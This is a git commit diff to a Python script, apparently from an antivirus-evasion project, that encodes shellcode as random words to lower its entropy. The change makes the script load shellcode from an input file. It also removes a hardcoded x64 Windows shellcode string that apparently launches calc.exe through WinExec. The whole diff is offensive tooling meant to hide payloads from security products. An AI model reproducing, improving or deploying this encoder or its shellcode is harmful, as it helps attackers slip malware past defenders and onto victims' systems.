94716b022750ba0abeeb1e0572f42acd1f2990cb
Natsukooh <romain74.baudet@gmail.com>
2023-02-08 16:20:17 +0100

    adapted the shellcode_encryption script

--- src/technique_2_reducing_entropy/shellcode_encryption.py
+++ src/technique_2_reducing_entropy/shellcode_encryption.py
@@ -6,6 +6,31 @@
 # pip3 install random-word
 
 from random_word import RandomWords
+import sys
+import re
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <input_file>")
+    sys.exit(1)
+
+input_file_name = sys.argv[1]
+
+def get_shellcode_from_file(input_file_name):
+    # Shellcode placeholder
+    shellcode = ""
+    # Shellcode line regex
+    regex = re.compile("^\s*\"(.*)\";?$")
+    # Opening the file
+    with open(input_file_name, "r") as input:
+        lines = input.readlines()
+        # Iterating through the lines
+        for line in lines:
+            # If a line starts with a double quote (with optionnal spaces or tabs before), it is the beginning of a part of the shellcode
+            if regex.match(line):
+                # We add the shellcode part to the shellcode string
+                shellcode += regex.match(line).group(1)
+    return shellcode
+
 
 rw= RandomWords()
 
@@ -35,8 +60,7 @@ def encrypt(hex_list, key):
 #Put your shellcode here
 #Be careful, you can keep the several "" but it MUST be in ONE LINE, remove semi colon
 # https://lingojam.com/TexttoOneLine
-shellcode = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48""\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8""\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1""\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d""\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44""\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2""\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48""\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04""\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07""\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8""\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7""\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50""\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6"
-
+shellcode = get_shellcode_from_file(input_file_name)
 
 shellcode = shellcode.replace('"', '')
 
